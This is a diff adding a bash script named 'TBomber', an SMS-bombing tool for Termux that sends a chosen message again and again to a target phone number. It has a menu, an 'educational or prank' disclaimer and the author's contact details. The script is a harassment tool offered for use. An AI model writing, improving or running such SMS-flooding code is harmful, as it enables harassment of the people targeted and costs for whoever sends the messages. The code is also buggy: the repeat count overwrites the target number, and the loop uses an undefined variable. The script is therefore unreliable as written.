@@ -1,0 +1,95 @@
+#!/bin/bash
+clear
+echo -e "\e[4;31m SpeedX Productions !!! \e[0m"
+echo -e "\e[1;34m Presents \e[0m"
+echo -e "\e[1;32m TBomber \e[0m"
+echo -e "\e[4;32m Make Sure That You Have Installed Termux:API in Your Phone \e[0m"
+echo "Press Enter To Continue"
+read a1
+apt update
+pkg upgrade
+pkg install figlet toilet
+apt install termux-api
+for (( start=5;start>=5;start++ ))
+do
+clear
+figlet TBomber
+echo -e "\e[1;34m Created By \e[0m"
+toilet -f mono12 -F gay SpeedX
+echo -e "\e[4;34m This Bomber Was Created By SpeedX \e[0m"
+echo -e "\e[1;34m For Any Queries Mail Me!!!\e[0m"
+echo -e "\e[1;32m           Mail: ggspeedx29@gmail.com \e[0m"
+echo -e "\e[4;32m  Facebook Page: https://www.facebook.com/GyanaTech \e[0m"
+echo " "
+echo -e "\e[4;31m Please Read Instruction Carefully !!! \e[0m"
+echo " "
+echo "Press 1 to Start Bombing "
+echo "Press 2 For Instructions "
+echo "Press 3 to Exit "
+read ch
+if [ $ch -eq 1 ];then
+clear
+figlet TBomber
+echo -e "\e[1;34m Created By \e[0m"
+toilet -f mono12 -F gay SpeedX
+echo "Enter A Number To Bomb:"
+read num
+echo "Enter Message To Send:"
+read mess
+echo "Number Of Times To Send (Bomb):"
+read num
+termux-vibrate -f
+termux-toast Bombing Started !!!
+termux-sms-send -n $num $mess
+for (( i=1;i<=$n;i++ ))
+do
+termux-sms-send -n $num $mess
+done
+termux-toast Bombing On Progress !!!
+echo -e "\e[4;34m The App Will Exit Now To Complete Bombing Process !!! \e[0m"
+echo -e "\e[4;34m Do not Close This Termux Window Till Bombing Completes !!! \e[0m"
+echo "Press Enter To Exit"
+read a2
+clear
+start=1
+termux-toast Thanks For Using TBomber
+termux-toast Created By SpeedX
+exit 0
+elif [ $ch -eq 2 ];then
+clear
+figlet TBomber
+echo -e "\e[1;34mCreated By \e[0m"
+toilet -f mono12 -F gay SpeedX
+echo  " "
+echo -e "\e[1;31m This Script is Only For Educational Purposes or To Prank.\e[0m"
+echo -e "\e[1;31m Do not Use This To Harm Others. \e[0m"
+echo -e "\e[1;31m I Am Not Responsible For The Misuse Of The Script. \e[0m"
+echo -e "\e[1;32m Make Sure You Have Installed Termux:API in Your Phone To Bomb Successfully.\e[0m"
+echo -e "\e[1;32m This Script Sends SMS Which Costs Money. \e[0m"
+echo -e "\e[1;32m So , Remember To Use A SMS Pack Before Using This Script.\e[0m"
+echo -e "\e[1;32m or You Would Be in a Loss ;-) \e[0m"
+echo -e "\e[1;34m If This Script Asks For Permissions, Give it !!! \e[0m"
+echo -e "\e[1;34m Do not Forget To Set The Default SIM From Which SMS Would Go. \e[0m"
+echo  " "
+echo -e "\e[4;31m That's All !!!\e[0m"
+echo -e "\e[4;34m This Bomber Was Created By SpeedX\e[0m"
+echo -e "\e[1;34m For Any Queries Mail Me!!!\e[0m"
+echo -e "\e[1;32m           Mail: ggspeedx29@gmail.com \e[0m"
+echo -e "\e[4;32m  Facebook Page: https://www.facebook.com/GyanaTech \e[0m"
+echo "Press Enter To Go Home"
+read a3
+clear
+elif [ $ch -eq 3 ];then
+start=1
+termux-toast Thanks For Using TBomber
+termux-toast Created By SpeedX
+exit 0
+else
+echo -e "\e[4;32m Invalid Input !!! \e[0m"
+echo "Press Enter To Go Home"
+read a3
+start=6
+clear
+fi
+done
+
